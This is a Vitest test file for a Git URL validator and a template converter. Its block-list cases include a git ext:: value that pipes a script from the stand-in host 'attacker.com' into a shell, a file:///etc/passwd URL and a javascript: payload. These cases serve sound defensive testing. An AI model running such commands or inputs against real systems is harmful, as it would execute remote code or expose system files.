import { describe, it, expect } from "vitest";
import { isSafeGitUrl, externalToTemplate } from "../external-registry.js";
import type { ExternalTemplateDef } from "../external-registry.js";

const validDef: ExternalTemplateDef = {
  id: "my-tpl",
  name: "My Template",
  description: "A test template",
  repoUrl: "https://github.com/user/repo",
};

// ─── isSafeGitUrl ─────────────────────────────────────────────────────────────

describe("isSafeGitUrl", () => {
  it.each([
    "https://github.com/user/repo",
    "https://github.com/user/repo.git",
    "http://github.com/user/repo",
    "git@github.com:user/repo",
    "git@github.com:user/repo.git",
    "git@gitlab.com:org/project",
  ])("allows safe URL: %s", (url) => {
    expect(isSafeGitUrl(url)).toBe(true);
  });

  it.each([
    "ext::sh -c 'curl attacker.com | sh'",
    "file:///etc/passwd",
    "ftp://server/repo",
    "javascript:alert(1)",
    "ssh://user@host/repo",
    "",
    "   ",
    "just-a-string",
  ])("blocks unsafe URL: %s", (url) => {
    expect(isSafeGitUrl(url)).toBe(false);
  });
});

// ─── externalToTemplate ───────────────────────────────────────────────────────

describe("externalToTemplate", () => {
  it("returns a Template for a valid def", () => {
    const tpl = externalToTemplate(validDef);
    expect(tpl.id).toBe("ext:my-tpl");
    expect(tpl.name).toBe("My Template");
  });

  it("prefixes the id with ext:", () => {
    const tpl = externalToTemplate(validDef);
    expect(tpl.id).toMatch(/^ext:/);
  });

  it("falls back category to web when unset", () => {
    const tpl = externalToTemplate(validDef);
    expect(tpl.category).toBe("web");
  });

  it("throws on ext:: URL", () => {
    expect(() =>
      externalToTemplate({ ...validDef, repoUrl: "ext::sh -c 'evil'" }),
    ).toThrow(/unsafe repoUrl/);
  });

  it("throws on file:// URL", () => {
    expect(() =>
      externalToTemplate({ ...validDef, repoUrl: "file:///etc/passwd" }),
    ).toThrow(/unsafe repoUrl/);
  });

  it("throws on empty URL", () => {
    expect(() =>
      externalToTemplate({ ...validDef, repoUrl: "" }),
    ).toThrow(/unsafe repoUrl/);
  });
});
